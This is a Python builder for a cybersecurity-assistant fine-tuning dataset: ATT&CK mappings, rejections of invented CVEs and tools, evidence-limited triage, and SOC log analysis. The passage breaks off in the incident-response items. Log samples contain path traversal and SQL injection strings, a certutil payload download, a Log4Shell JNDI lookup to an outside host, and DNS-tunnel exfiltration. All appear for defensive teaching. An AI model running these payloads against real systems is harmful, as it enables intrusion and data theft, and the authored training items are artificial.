"""Dataset builder for Gemma4-CyberAi SFT v0.2.

Why a new builder (not an edit of `builder.py`)
-----------------------------------------------
`builder.py` reproduces the historical `sft_v0.1.jsonl` and is left frozen for
reproducibility. This module authors a *different*, higher-quality dataset and is
guaranteed distinct at the assistant-answer level.

What changed vs v0.1 (the concrete quality fixes)
-------------------------------------------------
* **No clone loops.** v0.1 wrapped ~91 unique answers in `for var in range(...)` loops
  that changed only "Case {N}", inflating to 360 rows with heavy duplication. v0.2
  authors each example once; a runtime guard (`_Deduper`) raises if any two assistant
  answers are identical, so superficial duplication cannot recur by construction.
* **Exact ATT&CK IDs are taught.** v0.1 never contained `T1558.003` (the ID the base
  model hallucinated as `T1060`). v0.2 derives an ATT&CK-precision + *contrastive*
  family directly from the verified fact registry (`data/knowledge/security_facts.json`),
  so training data, benchmark scorers, and the judge rubric all cite the SAME fact and
  cannot drift.
* **Contrastive correction.** Items explicitly reject the wrong IDs/mechanics (e.g. "it
  is NOT T1060 / not Privilege Escalation / the ticket does not contain a password hash").

Provenance/licensing: every item is original, project-authored content released under
`CC-BY-4.0`, matching `DATA_LICENSES.md` and the schema validator. No third-party or
proprietary (HTB/THM) content.
"""

from __future__ import annotations

from pathlib import Path

from gemma_cyber.data.schema import TrainingItem, TrainingMessage, TrainingMetadata
from gemma_cyber.knowledge import FactRegistry, load_fact_registry

PROVENANCE = "authored for gemma-cyber sft_v0.2"

SYS_RIGOROUS = (
    "You are a rigorous cybersecurity assistant. Reason carefully from facts. Flag "
    "non-existent or fabricated CVEs, tools, and commands rather than inventing details."
)
SYS_ANALYST = (
    "You are a careful cybersecurity analyst. Reason strictly from evidence. When "
    "evidence is incomplete or ambiguous, state the limits and list the missing data "
    "instead of speculating."
)
SYS_SOC = (
    "You are an expert SOC detection and log-triage analyst. Give structured, "
    "evidence-grounded analysis with clear, prioritized response guidance."
)
SYS_IR = (
    "You are a seasoned incident responder. Give prioritized, actionable containment, "
    "eradication, and forensic guidance, and preserve evidence."
)
SYS_DET = (
    "You are a detection-engineering specialist. Write precise detection logic and "
    "correct MITRE ATT&CK mappings with explicit field definitions."
)
SYS_AD = (
    "You are an Active Directory and Windows security architect. Explain domain "
    "protocols, attack mechanics, and defenses with technical accuracy and exact "
    "MITRE ATT&CK identifiers."
)
SYS_ATTACK = (
    "You are a MITRE ATT&CK specialist. Give the exact current technique ID, "
    "sub-technique, and primary tactic. Distinguish techniques from tactics and correct "
    "common mis-mappings. If unsure of a current mapping, say so rather than guessing."
)
SYS_EDU = (
    "You are a cybersecurity educator for authorized CTF labs and penetration-testing "
    "methodology. Explain concepts ethically with technical rigor."
)
SYS_FUND = (
    "You are a foundational cybersecurity instructor. Explain core principles, "
    "cryptography, and architecture precisely."
)
SYS_SAFE = (
    "You are an ethical cybersecurity assistant. Decline to produce weaponized exploits, "
    "unauthorized-access instructions, or malware, while explaining the relevant "
    "defensive principles and detections."
)


class _Deduper:
    """Collects items while guaranteeing distinct assistant answers and unique ids."""

    def __init__(self) -> None:
        self.items: list[TrainingItem] = []
        self._answers: set[str] = set()
        self._ids: set[str] = set()

    def add(
        self,
        item_id: str,
        system: str,
        user: str,
        assistant: str,
        *,
        task_type: str,
        domain: str,
        difficulty: str = "intermediate",
        requires_evidence: bool = True,
        fabricated_premise: bool = False,
        tags: list[str] | None = None,
    ) -> None:
        norm = " ".join(assistant.split()).lower()
        if norm in self._answers:
            raise ValueError(f"[{item_id}] duplicate assistant answer (superficial variation)")
        if item_id in self._ids:
            raise ValueError(f"[{item_id}] duplicate id")
        self._answers.add(norm)
        self._ids.add(item_id)
        self.items.append(
            TrainingItem(
                id=item_id,
                messages=[
                    TrainingMessage(role="system", content=system),
                    TrainingMessage(role="user", content=user),
                    TrainingMessage(role="assistant", content=assistant),
                ],
                metadata=TrainingMetadata(
                    task_type=task_type,  # type: ignore[arg-type]
                    domain=domain,  # type: ignore[arg-type]
                    difficulty=difficulty,  # type: ignore[arg-type]
                    requires_evidence=requires_evidence,
                    fabricated_premise=fabricated_premise,
                    source="original",
                    license="CC-BY-4.0",
                    provenance=PROVENANCE,
                    tags=tags or [],
                ),
            )
        )


# ==========================================================================================
# 1. ATT&CK precision + contrastive family — DERIVED FROM THE VERIFIED FACT REGISTRY.
#    This is legitimate programmatic diversity: each technique has a genuinely different
#    ID, tactic, and mechanics, so no two answers are alike.
# ==========================================================================================

def _attack_family(dd: _Deduper, reg: FactRegistry) -> None:
    for key in reg.technique_keys():
        t = reg.technique(key)
        facts = " ".join(f"- {f}" for f in t.key_facts)
        facts_block = "\n".join(f"- {f}" for f in t.key_facts)

        # (a) Primary: state the exact ID + tactic + mechanics.
        primary = (
            f"**{t.name}** maps to **MITRE ATT&CK {t.id}**"
            + (f" (a sub-technique of {t.parent_id})" if t.parent_id else "")
            + f", under the **{t.tactic} ({t.tactic_id})** tactic.\n\n"
            f"Key mechanics:\n{facts_block}"
        )
        dd.add(
            f"train-attack-{key}-primary",
            SYS_ATTACK,
            f"What is the MITRE ATT&CK technique ID and primary tactic for "
            f"{t.aliases[0]}, and how does it work?",
            primary,
            task_type="attack_mapping",
            domain="blue_team",
            difficulty="intermediate",
            requires_evidence=False,
            tags=["attack_mapping", "exact_id", key],
        )

        # (b) Contrastive: reject the common wrong IDs / claims for this technique.
        if t.forbidden_ids or t.forbidden_claims:
            wrong_ids = ", ".join(t.forbidden_ids) or "unrelated technique IDs"
            confusions = "\n".join(
                f"- **{bad}** is wrong here: {why}" for bad, why in t.confused_with.items()
            )
            bad_claims = "\n".join(f"- Incorrect: \"{c}\"." for c in t.forbidden_claims)
            body = [
                f"The correct mapping is **{t.id} — {t.name}**, tactic "
                f"**{t.tactic} ({t.tactic_id})**. Several plausible-sounding statements are "
                f"factually wrong:",
            ]
            if confusions:
                body.append(f"\n**Mis-mapped IDs ({wrong_ids}):**\n{confusions}")
            if bad_claims:
                body.append(f"\n**False mechanics:**\n{bad_claims}")
            body.append(f"\n**What is actually true:**\n{facts_block}")
            dd.add(
                f"train-attack-{key}-contrastive",
                SYS_ATTACK,
                f"A colleague claims {t.aliases[0]} is {t.forbidden_ids[0] if t.forbidden_ids else 'a different technique'} "
                f"and describes it loosely. Identify what is wrong and give the correct "
                f"ATT&CK mapping and mechanics.",
                "\n".join(body),
                task_type="attack_mapping",
                domain="blue_team",
                difficulty="advanced",
                requires_evidence=False,
                tags=["attack_mapping", "contrastive", "misconception", key],
            )

    # (c) The exact v0.1 failure, as an explicit correction target.
    k = reg.technique("kerberoasting")
    dd.add(
        "train-attack-kerberoasting-failure-correction",
        SYS_ATTACK,
        "Explain the MITRE ATT&CK technique for Kerberoasting. Is it T1060?",
        (
            "No — **Kerberoasting is not T1060**. `T1060` is an obsolete ID for "
            "*Registry Run Keys / Startup Folder* (a Persistence technique, now "
            "**T1547.001**) and has nothing to do with Kerberos.\n\n"
            f"Kerberoasting is **{k.id} — {k.name}**, a sub-technique of {k.parent_id}, "
            f"under **{k.tactic} ({k.tactic_id})** — *not* Privilege Escalation and *not* "
            "T1068 (Exploitation for Privilege Escalation).\n\n"
            "How it actually works:\n"
            "- Any authenticated domain user requests a **TGS** (service ticket) for an "
            "account that has a **Service Principal Name (SPN)** registered.\n"
            "- The DC encrypts part of that ticket with a key **derived from the service "
            "account's password** (its NTLM hash for RC4/etype 0x17). The attacker cracks "
            "that key **offline** — no failed logons on the DC.\n"
            "- The ticket does **not** contain any domain administrator password hash, and "
            "the discovery step is **SPN enumeration via LDAP**, not Nmap port scanning.\n\n"
            "Defense: gMSAs with long rotated passwords, enforce AES (disable RC4), and "
            "alert on Event ID 4769 with Ticket Encryption Type 0x17 from unusual hosts."
        ),
        task_type="attack_mapping",
        domain="blue_team",
        difficulty="advanced",
        requires_evidence=False,
        tags=["attack_mapping", "kerberoasting", "T1558.003", "contrastive", "correction"],
    )

    # (d) technique-vs-tactic distinction.
    dd.add(
        "train-attack-technique-vs-tactic",
        SYS_ATTACK,
        "Explain the difference between an ATT&CK tactic and a technique, using "
        "Credential Access as the example.",
        (
            "A **tactic** is the adversary's *goal* — the \"why\". A **technique** (and "
            "sub-technique) is *how* they achieve it. They live at different layers of the "
            "ATT&CK matrix and use different ID formats.\n\n"
            "- **Tactic:** *Credential Access* has ID **TA0006** (TA-prefixed). It is a "
            "column in the matrix, not something you 'map an action to' directly.\n"
            "- **Techniques under it** carry T-prefixed IDs, e.g. **T1558.003** "
            "(Kerberoasting), **T1003.001** (LSASS Memory), **T1110.003** (Password "
            "Spraying).\n\n"
            "So \"the tactic is T1558.003\" is a category error: T1558.003 is a technique; "
            "its tactic is TA0006. Map an observed behavior to a **technique ID**, then "
            "note which **tactic** it serves."
        ),
        task_type="attack_mapping",
        domain="blue_team",
        difficulty="intermediate",
        requires_evidence=False,
        tags=["attack_mapping", "technique_vs_tactic"],
    )
    _ = facts  # readability: key_facts already rendered above


# ==========================================================================================
# 2. Hallucination refusal & fabricated premises (fake CVEs / tools / products).
#    Each row is genuinely distinct (different artifact + different reason it is invalid).
# ==========================================================================================

def _hallucination_family(dd: _Deduper) -> None:
    fake_cves = [
        ("CVE-2029-44019", "the Linux kernel 6.12", "a zero-click eBPF privilege escalation"),
        ("CVE-2028-10492", "OpenSSH 9.8p1", "a pre-auth remote root in protocol negotiation"),
        ("CVE-2030-00192", "Google Chrome 140", "a V8 WebAssembly sandbox escape"),
        ("CVE-2028-99214", "Fortinet FortiOS 7.4.3", "an SSL-VPN unauthenticated command injection"),
        ("CVE-2029-77182", "Cisco IOS-XE 17.9", "a RESTCONF unauthenticated admin account creation"),
        ("CVE-2029-00991", "Samba 4.19 as an AD DC", "a DCERPC remote code execution"),
        ("CVE-2028-70192", "Kubernetes 1.30", "a kube-apiserver aggregation-layer auth bypass"),
        ("CVE-2027-88311", "Apache HTTP Server 2.4.60", "an HTTP/3 pseudo-header RCE"),
        ("CVE-2029-33812", "Docker Engine 26.1", "a containerd shim host breakout"),
        ("CVE-2028-88129", "Elasticsearch 8.13", "a painless-scripting sandbox escape"),
        ("CVE-2031-10001", "PostgreSQL 17.2", "a PL/pgSQL search_path arbitrary function call"),
        ("CVE-2028-44120", "Wireshark 4.2.5", "a TLS 1.3 dissector integer overflow"),
        ("CVE-2029-19283", "Windows Defender", "a real-time engine remote memory corruption"),
        ("CVE-2028-22910", "Jenkins Core 2.450", "a remoting-protocol Java deserialization"),
        ("CVE-2030-51001", "GitLab CE 18.0", "a CI runner token leak via GraphQL"),
    ]
    for i, (cve, target, claim) in enumerate(fake_cves, 1):
        year = cve.split("-")[1]
        dd.add(
            f"train-halluc-cve-{i:02d}",
            SYS_RIGOROUS,
            f"Give the official patch and a working proof-of-concept for {cve} in "
            f"{target}, which is {claim}.",
            (
                f"I can't do that: **{cve} is not a valid published CVE identifier**, so "
                f"there is no authoritative advisory or PoC to give.\n\n"
                f"- The year field ({year}) is in the future, which alone means it cannot be "
                f"an assigned record today.\n"
                f"- Nothing for this ID exists in the NVD (nvd.nist.gov) or the CVE Program "
                f"(cve.org).\n\n"
                f"To verify a real issue in {target.split(' as ')[0]}, check the vendor's "
                f"security advisories and confirm the exact identifier in NVD before acting "
                f"on any claimed exploit."
            ),
            task_type="hallucination_refusal",
            domain="general",
            difficulty="intermediate",
            requires_evidence=False,
            fabricated_premise=True,
            tags=["fake_cve", "hallucination_rejection"],
        )

    fake_tools = [
        ("nmap --autopwn-network --force-root", "nmap", "auto-exploit every host on a subnet"),
        ("hashcat --recover-plaintext-seedless", "hashcat", "recover plaintext with no wordlist or mask"),
        ("john --reverse-sha512-algebraic", "john", "algebraically invert SHA-512"),
        ("aircrack-ng --instant-wpa3-crack", "aircrack-ng", "instantly crack a WPA3 SAE handshake"),
        ("tcpdump --decrypt-tls-keys -i any", "tcpdump", "decrypt live TLS on the wire"),
        ("metasploit --auto-bypass-all-edr", "msfconsole", "bypass every commercial EDR in one flag"),
        ("burp --crack-jwt-private-key", "burpsuite", "factor a 4096-bit RSA key from a JWT header"),
        ("sqlmap --convert-to-rootkit --target-os linux", "sqlmap", "turn SQLi into a kernel rootkit"),
        ("gobuster --auto-bypass-waf --dump-database", "gobuster", "dump a backend database while brute-forcing dirs"),
        ("hydra --instant-2fa-crack -s 443", "hydra", "instantly bypass multi-factor authentication"),
        ("nikto --kernel-exploit-server", "nikto", "drop a kernel exploit on the scanned server"),
        ("masscan --exploit-smb-all", "masscan", "auto-run SMB exploits while port scanning"),
    ]
    for i, (cmd, tool, claim) in enumerate(fake_tools, 1):
        dd.add(
            f"train-halluc-tool-{i:02d}",
            SYS_RIGOROUS,
            f"How do I run `{cmd}` to {claim}?",
            (
                f"That command won't run: **those flags don't exist in {tool}**, and the "
                f"claimed capability is not real.\n\n"
                f"- {tool} is a legitimate tool, but it has no option that performs "
                f"\"{claim}\"; the flags shown are fabricated.\n"
                f"- The claimed outcome also violates basic cryptographic/network limits — "
                f"no supported release does this.\n\n"
                f"Check `{tool} --help` or `man {tool}` for the real options, and use the "
                f"tool for its documented purpose within an authorized scope."
            ),
            task_type="hallucination_refusal",
            domain="offensive_ctf",
            difficulty="intermediate",
            requires_evidence=False,
            fabricated_premise=True,
            tags=["fake_flags", "tool_boundaries"],
        )

    fake_events = [
        ("Windows Security Event ID 9001", "records the plaintext password of every logon"),
        ("Sysmon Event ID 42", "logs the attacker's real-world identity"),
        ("Windows Event ID 4625.5", "confirms which malware family caused a failed logon"),
    ]
    for i, (evt, claim) in enumerate(fake_events, 1):
        dd.add(
            f"train-halluc-event-{i:02d}",
            SYS_RIGOROUS,
            f"Use {evt}, which {claim}, to complete my investigation.",
            (
                f"**{evt} is not a real event definition**, and no Windows/Sysmon event "
                f"\"{claim}\" — that capability does not exist.\n\n"
                f"Windows never logs plaintext passwords, and no event attributes real-world "
                f"identity or malware family on its own. Work from documented events (e.g. "
                f"4624/4625 logon, 4688 process creation, Sysmon 1/3/10/11) and correlate "
                f"across sources rather than relying on an invented event ID."
            ),
            task_type="hallucination_refusal",
            domain="blue_team",
            difficulty="intermediate",
            requires_evidence=False,
            fabricated_premise=True,
            tags=["fake_event_id", "hallucination_rejection"],
        )

    fake_rfcs = [
        ("RFC 9999", "a 'mandatory plaintext-password recovery' extension to TLS 1.3"),
        ("RFC 8888.1", "a Kerberos option that returns account passwords to any client"),
        ("RFC 10500", "an HTTP header that disables all server-side authentication"),
    ]
    for i, (rfc, claim) in enumerate(fake_rfcs, 1):
        dd.add(
            f"train-halluc-rfc-{i:02d}",
            SYS_RIGOROUS,
            f"Implement {rfc}, which defines {claim}.",
            (
                f"I can't implement that: **{rfc} does not define {claim}**, and such a "
                f"mechanism would contradict how these protocols are designed.\n\n"
                f"TLS 1.3, Kerberos, and HTTP have no standard that hands out plaintext "
                f"passwords or globally disables authentication — that would be a "
                f"vulnerability, not a feature. Verify any RFC number and its actual scope at "
                f"rfc-editor.org before building to it."
            ),
            task_type="hallucination_refusal", domain="general", difficulty="intermediate",
            requires_evidence=False, fabricated_premise=True,
            tags=["fake_rfc", "hallucination_rejection"],
        )

    fake_protocols = [
        ("SAKP (Secure Auto-Key Protocol)", "auto-negotiates encryption with zero key exchange"),
        ("QuantumAuth v2", "authenticates users with no secret, credential, or token"),
    ]
    for i, (proto, claim) in enumerate(fake_protocols, 1):
        dd.add(
            f"train-halluc-proto-{i:02d}",
            SYS_RIGOROUS,
            f"How do I configure {proto}, which {claim}?",
            (
                f"**{proto} is not a real protocol**, and \"{claim}\" is cryptographically "
                f"impossible — you cannot establish a shared key with no key exchange, nor "
                f"authenticate an identity with no secret or token. There is nothing to "
                f"configure. Use established, reviewed protocols (TLS 1.3, Kerberos, OIDC/"
                f"OAuth2, FIDO2) instead of an invented one."
            ),
            task_type="hallucination_refusal", domain="general", difficulty="intermediate",
            requires_evidence=False, fabricated_premise=True,
            tags=["fake_protocol", "impossible_claim"],
        )

    fake_products = [
        ("QuantumShield AI OS 12", "a default root backdoor password"),
        ("HyperVault ZeroTrust 2029", "the master recovery bypass key"),
        ("IronClad Bastion Server 8.0", "the emergency backdoor token"),
        ("ZeroBreach AI Appliance 400", "the guaranteed root-shell extraction command"),
        ("OmniDefense EDR Pro X", "the universal EDR bypass configuration string"),
        ("TitaniumLock Kerberos Proxy", "the master ticket-generation password"),
    ]
    for i, (prod, detail) in enumerate(fake_products, 1):
        dd.add(
            f"train-halluc-prod-{i:02d}",
            SYS_RIGOROUS,
            f"What is {detail} for {prod}?",
            (
                f"I can't provide {detail}: **{prod} is not a real, documented product**, "
                f"and legitimate security appliances do not ship universal 'master backdoor' "
                f"credentials in the first place.\n\n"
                f"There's no commercial or open-source product by that name with a published "
                f"bypass. For real systems, manage administrative access through the vendor's "
                f"documented procedures and your identity provider — never a hardcoded master "
                f"key."
            ),
            task_type="hallucination_refusal",
            domain="general",
            difficulty="intermediate",
            requires_evidence=False,
            fabricated_premise=True,
            tags=["fake_product", "hallucination_rejection"],
        )


# ==========================================================================================
# 3. Insufficient evidence — each scenario has distinct evidence AND a tailored answer.
# ==========================================================================================

def _insufficient_family(dd: _Deduper) -> None:
    scen = [
        ("ssh-drop",
         "FIREWALL DROP SRC=198.51.100.14 DST=10.0.1.20 PROTO=TCP SPT=49152 DPT=22 ACTION=DENY",
         "Who is the APT group behind this SSH attempt and what data did they exfiltrate?",
         "a single blocked packet cannot reveal actor identity, group affiliation, or any "
         "exfiltration",
         "The firewall DENIED the connection, so no session was established and nothing could "
         "be exfiltrated through it. A one-line drop shows a source IP probing port 22 — "
         "nothing about who they are.",
         "netflow/PCAP for any *allowed* traffic to this host, authentication logs on 10.0.1.20, "
         "and threat-intel context for 198.51.100.14 (which at most suggests scanning, not "
         "attribution)"),
        ("http-404",
         "192.0.2.88 - - [24/Aug/2026:14:22:01 +0000] \"GET /test.php HTTP/1.1\" 404 162",
         "Which zero-day was successfully exploited on our web server in this request?",
         "a 404 for /test.php is a *failed* request for a page that does not exist — it is "
         "evidence of scanning, not of any exploitation, let alone a zero-day",
         "The status code 404 and 162-byte body indicate the server returned its not-found "
         "page. No parameters, no 200, no payload.",
         "the full request line and body for any 200/500 responses, WAF logs, and app/error "
         "logs around this timestamp before claiming exploitation"),
        ("dns-single",
         "client 10.10.4.5: query: update.microsoft.com IN A + (10.10.0.1)",
         "Confirm this host is compromised with C2 beaconing malware.",
         "one benign-looking DNS A query to a legitimate Microsoft update domain cannot "
         "confirm compromise or beaconing",
         "update.microsoft.com is expected traffic. Beaconing is inferred from *periodicity*, "
         "volume, and destination reputation over time — none of which a single query shows.",
         "a time series of this host's DNS/NetFlow, the resolved IPs, and process-to-connection "
         "attribution before alleging C2"),
        ("oom",
         "web-01 kernel: Out of memory: Kill process 1829 (mysqld) score 450 or sacrifice child",
         "Which cyber attack crashed the database at this time?",
         "an OOM-killer message is an operating-system resource event, not by itself evidence "
         "of an attack",
         "The kernel terminated mysqld to reclaim memory. That is commonly a capacity/config "
         "issue (workload spike, memory limit) — attack is only one of several hypotheses.",
         "memory/CPU trends, slow-query and connection logs, and any correlated web traffic "
         "spike; only then can you distinguish load from a deliberate resource-exhaustion attack"),
        ("edr-ps",
         "Process spawned: powershell.exe on WORKSTATION-19 at 09:30:11 UTC. Parent PID: 412.",
         "Was this ransomware, and which files did it encrypt?",
         "the bare fact that powershell.exe started says nothing about intent or file impact",
         "PowerShell runs constantly for legitimate administration. Without the command line, "
         "the parent image, signer, and subsequent file/registry activity, intent is unknown.",
         "the full command line, parent process image, script-block logging (4104), and any "
         "file-modification telemetry before calling it ransomware"),
        ("icmp",
         "[1:1000001:1] PROTOCOL-ICMP Large ICMP Echo Request 198.51.100.99 -> 10.0.0.1",
         "Confirm this ping is exfiltration and extract the stolen card numbers from the payload.",
         "a single large-ICMP alert cannot confirm exfiltration, and the alert does not include "
         "decoded payload contents to 'extract' anything from",
         "Large ICMP can be tunneling, but it is also produced by MTU discovery, monitoring, and "
         "misconfiguration. One alert with no payload capture proves nothing about card data.",
         "the actual ICMP payloads (PCAP), a baseline of normal ICMP for this pair, and endpoint "
         "context before asserting data theft"),
        ("rdp-login",
         "AUDIT: User 'asmith' logged on from 10.0.0.45 via RDP (Logon Type 10) at 08:00.",
         "Confirm asmith is a malicious insider stealing intellectual property.",
         "a single successful RDP logon is normal activity and cannot establish malicious intent "
         "or data theft",
         "Logon Type 10 (RemoteInteractive) at 08:00 from an internal IP is consistent with a "
         "normal workday. Intent and IP theft are conclusions the log does not support.",
         "asmith's baseline logon pattern, whether 10.0.0.45 is their assigned host, and any "
         "file-access/DLP telemetry before alleging insider theft"),
        ("temp-file",
         "ALERT: file C:\\Windows\\Temp\\tmp994.tmp created on HOST-PROD-01 at 04:12 UTC.",
         "Give the full nation-state attribution and initial-access vector for this file.",
         "a temp-file-creation alert with no hash, no writer process, and no content cannot "
         "yield attribution or an access vector",
         "Temp files are created constantly by legitimate software. Nothing here identifies the "
         "writing process, the file's contents, or how anything got onto the host.",
         "the creating process (Sysmon 11 + parent), the file hash/signature, and any preceding "
         "network/logon events before attributing anything"),
        ("beacon-claim",
         "NETFLOW: 10.0.2.15:443 -> 93.184.216.34:443 Bytes=1504 Packets=2 Duration=0.01s",
         "Extract the decrypted TLS payload and show the stolen credentials in this flow.",
         "NetFlow records metadata only (no packet contents), so there is no payload to decrypt, "
         "and one 1.5 KB flow shows nothing about credentials",
         "This is a tiny, brief HTTPS flow. NetFlow never carries payload, and TLS content is "
         "encrypted; 'decrypting the flow' is not possible from this record.",
         "full PCAP with TLS keys (or endpoint TLS logging), plus destination reputation and a "
         "traffic baseline, before claiming credential theft"),
    ]
    for key, ev, q, cannot, shows, missing in scen:
        dd.add(
            f"train-insuf-{key}",
            SYS_ANALYST,
            f"Evidence:\n```\n{ev}\n```\nQuestion: {q}",
            (
                f"Based strictly on this evidence, **that cannot be concluded** — {cannot}.\n\n"
                f"**What the evidence actually shows:** {shows}\n\n"
                f"**What is missing:** To move forward you would need {missing}.\n\n"
                f"State findings at the level the evidence supports, and flag the rest as "
                f"unknown rather than asserting a specific confident answer."
            ),
            task_type="insufficient_evidence",
            domain="blue_team",
            difficulty="advanced",
            requires_evidence=True,
            tags=["insufficient_evidence", "forensic_restraint", key],
        )


# ==========================================================================================
# 4. Log analysis — distinct real log patterns, each with a tailored analysis.
# ==========================================================================================

def _log_family(dd: _Deduper) -> None:
    scen = [
        ("ssh-bruteforce-success",
         "Aug 24 03:10:01 srv sshd[1101]: Failed password for invalid user admin from 198.51.100.77 port 41200 ssh2\n"
         "Aug 24 03:10:05 srv sshd[1105]: Failed password for invalid user oracle from 198.51.100.77 port 41204 ssh2\n"
         "Aug 24 03:10:08 srv sshd[1108]: Accepted password for deploy from 198.51.100.77 port 41208 ssh2",
         "Identify the attack pattern, the critical event, and immediate containment.",
         "**Pattern:** automated SSH password guessing from `198.51.100.77` against common "
         "usernames (`admin`, `oracle`).\n"
         "**Critical event:** at 03:10:08 `Accepted password for deploy` — a **successful "
         "compromise** of the `deploy` account from the same source.\n\n"
         "**Containment:** block `198.51.100.77` at the perimeter; kill `deploy`'s sessions; "
         "rotate its password and `authorized_keys`; then inspect `~deploy/.ssh`, running "
         "processes, cron, and `/tmp` for persistence."),
        ("win-4625-4624-svc",
         "Event 4625: account svc_sql failed to log on. Logon Type 3. Source 10.0.5.99. (x45 in 60s)\n"
         "Event 4624: account svc_sql logged on. Logon Type 3. Source 10.0.5.99.",
         "Interpret these Windows events, explain Logon Type 3, and give the next step.",
         "**Logon Type 3 = network logon** (SMB share, IIS, RPC/WMI) with no interactive "
         "desktop.\n"
         "**Sequence:** 45 rapid **4625** failures then a **4624** success for `svc_sql` from "
         "`10.0.5.99` is a successful **network password-guessing** attack on a service "
         "account.\n\n"
         "**Next:** isolate `10.0.5.99`; reset `svc_sql` and review its SPNs; hunt on the "
         "source host for the tool (e.g. CrackMapExec)."),
        ("web-traversal-sqli",
         "192.0.2.45 \"GET /view?page=../../../../etc/passwd HTTP/1.1\" 200 2412\n"
         "192.0.2.45 \"GET /api/products?id=1 UNION SELECT null,username,password FROM users-- HTTP/1.1\" 200 5840",
         "Identify the two attack classes, whether they likely succeeded, and the code fix.",
         "**Request 1 — path traversal:** `page=../../../../etc/passwd` returned **200/2412 "
         "bytes**, suggesting the file was served. Fix: validate against an allowlist / use "
         "basename, never concatenate user input into a path.\n\n"
         "**Request 2 — UNION SQL injection:** returned **200/5840 bytes**, suggesting rows "
         "were exfiltrated. Fix: **parameterized queries** with typed binding for `id`."),
        ("win-4688-encoded-ps",
         "Event 4688: New process. Parent: C:\\Windows\\System32\\w3wp.exe -> "
         "cmd.exe /c powershell.exe -nop -w hidden -enc JABjAGwAaQBl...",
         "Explain the chain, why it is suspicious, and the ATT&CK techniques.",
         "**Chain:** IIS worker `w3wp.exe` -> `cmd.exe` -> hidden, base64-encoded PowerShell. "
         "A web worker spawning an obfuscated shell strongly indicates a **web shell / RCE**.\n\n"
         "**ATT&CK:** **T1505.003** (Web Shell), **T1059.001** (PowerShell) with `-enc`/"
         "`-w hidden`, and **T1027** (Obfuscated Files or Information)."),
        ("dns-tunnel",
         "10.0.0.12 A 4d616c6963696f75.tunnel.attacker-domain.com\n"
         "10.0.0.12 TXT 4b65793d53657373.tunnel.attacker-domain.com",
         "What technique is this, how does the encoding work, and how do you detect it broadly?",
         "**Technique:** DNS tunneling / exfiltration (**T1071.004** / **T1048.003**). Data is "
         "hex/base32-encoded into subdomain labels and queried against an attacker-controlled "
         "apex (`tunnel.attacker-domain.com`).\n\n"
         "**Detection:** high Shannon entropy on labels, unusually long subdomains, high "
         "volume of TXT/NULL queries to one apex, and NXDOMAIN bursts per host."),
        ("sysmon1-lolbin",
         "Sysmon Event 1: Image: C:\\Windows\\System32\\certutil.exe  "
         "CommandLine: certutil -urlcache -split -f http://198.51.100.7/a.exe a.exe",
         "What is happening and which ATT&CK technique applies?",
         "`certutil` is a signed Windows binary being abused as a **LOLBin to download** a "
         "remote payload (`-urlcache -split -f <url>`). This is **T1105 (Ingress Tool "
         "Transfer)**, often paired with **T1140** if it also decodes the file. Alert on "
         "certutil with a URL argument; it has no legitimate reason to fetch arbitrary EXEs."),
        ("linux-auditd-sudo",
         "type=USER_AUTH ... acct=\"jdoe\" exe=\"/usr/bin/sudo\" res=failed (x12)\n"
         "type=USER_CMD ... acct=\"jdoe\" cmd=\"/bin/bash\" res=success",
         "Interpret this auditd sequence.",
         "Twelve failed `sudo` authentications for `jdoe` followed by a successful `sudo` to "
         "`/bin/bash` indicates repeated password attempts culminating in a root shell. "
         "Confirm whether `jdoe` legitimately has sudo and whether the timing/host matches "
         "their baseline; if not, treat as credential misuse and review the resulting shell's "
         "activity."),
        ("cloudtrail-iam",
         "eventName=CreateAccessKey userIdentity.type=IAMUser ...\n"
         "eventName=AttachUserPolicy policyArn=arn:aws:iam::aws:policy/AdministratorAccess",
         "What does this CloudTrail sequence indicate?",
         "A user created a new access key and then attached **AdministratorAccess** to an IAM "
         "user. Together this is a classic **privilege-escalation / persistence** pattern in "
         "AWS (ATT&CK **T1098** Account Manipulation). Verify the actor was authorized to grant "
         "admin; if not, detach the policy, disable the key, and review what the new key did."),
        ("win-7045-service",
         "Event 7045: A service was installed. Service Name: mgtsvc  "
         "Image Path: %COMSPEC% /c powershell -enc <...>  Start Type: demand  Account: LocalSystem",
         "Interpret this System-log event.",
         "**Event ID 7045** logs a newly installed service. Here the image path is `cmd.exe /c "
         "powershell -enc ...` running as **LocalSystem** — services normally point at a real "
         "binary, not an encoded PowerShell one-liner. This is service-based execution/"
         "persistence (**T1543.003**) and matches PsExec-style lateral movement. Verify against "
         "change control; if unexpected, isolate and hunt the source host."),
        ("win-4769-spike",
         "Event 4769 x60 in 2 min from one account: many SPNs, Ticket Encryption Type 0x17, "
         "Failure Code 0x0.",
         "What does this Kerberos telemetry indicate?",
         "**Event ID 4769** is a TGS (service-ticket) request. Sixty successful requests for "
         "**many distinct SPNs** from one account, all with **RC4 (0x17)**, in two minutes is a "
         "textbook **Kerberoasting** signature (**T1558.003**): the attacker is bulk-requesting "
         "roastable tickets and forcing RC4 for faster offline cracking. Investigate the "
         "requesting account/host and reset exposed service-account passwords."),
        ("suricata-log4shell",
         "Suricata: HTTP User-Agent: ${jndi:ldap://198.51.100.9/a} -> 10.0.3.4:8080",
         "What is this and what should the SOC check?",
         "This is a **Log4Shell (JNDI injection)** attempt: a `${jndi:ldap://...}` string placed "
         "in a header so a vulnerable Log4j instance performs an attacker-controlled LDAP lookup "
         "and loads a remote class (exploitation of a public-facing app, **T1190**). Check "
         "whether `10.0.3.4:8080` runs a vulnerable Log4j version, whether it made the outbound "
         "LDAP call, and block egress to `198.51.100.9`."),
        ("zeek-conn-beacon",
         "Zeek conn.log: 10.0.5.7 -> 203.0.113.10:443 every ~60s, ~800 bytes each, over 6 hours.",
         "Interpret this Zeek connection pattern.",
         "Regular ~60-second connections of near-constant small size to one external host over "
         "hours is a **beaconing** pattern consistent with C2 over web protocols (**T1071.001**). "
         "The periodicity and low jitter — not any single connection — are the signal. Pivot on "
         "the destination's reputation, decode any TLS SNI/JA3, and attribute the source process "
         "before escalating."),
    ]
    for key, log, task, ans in scen:
        dd.add(
            f"train-log-{key}",
            SYS_SOC,
            f"Log:\n```\n{log}\n```\nTask: {task}",
            ans,
            task_type="log_analysis",
            domain="blue_team",
            difficulty="advanced",
            requires_evidence=True,
            tags=["log_analysis", "siem", key],
        )


# ==========================================================================================
# 5. Incident response — distinct scenarios.
# ==========================================================================================

def _ir_family(dd: _Deduper) -> None:
    scen = [
        ("ransomware-isolate-not-poweroff",
         "An endpoint is actively encrypting network shares and dropping ransom notes. A junior "
         "analyst wants to pull the power cord. Evaluate that.",
         "**Do not power it off — isolate it from the network instead** (unplug Ethernet / "
